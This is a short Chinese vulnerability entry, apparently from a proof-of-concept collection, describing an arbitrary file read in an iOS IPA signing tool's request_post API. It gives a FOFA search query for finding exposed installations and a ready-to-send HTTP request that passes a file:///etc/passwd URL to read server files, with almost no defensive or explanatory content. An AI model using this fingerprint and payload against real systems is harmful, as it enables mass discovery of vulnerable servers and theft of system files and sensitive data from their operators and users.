# 苹果IOS端IPA签名工具request_post任意文件读取漏洞

苹果IOS端IPA签名工具request_post任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
body="/assets/index/css/mobileSelect.css"
```

## poc

```javascript
GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```

![image-20240926101437457](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409261014514.png)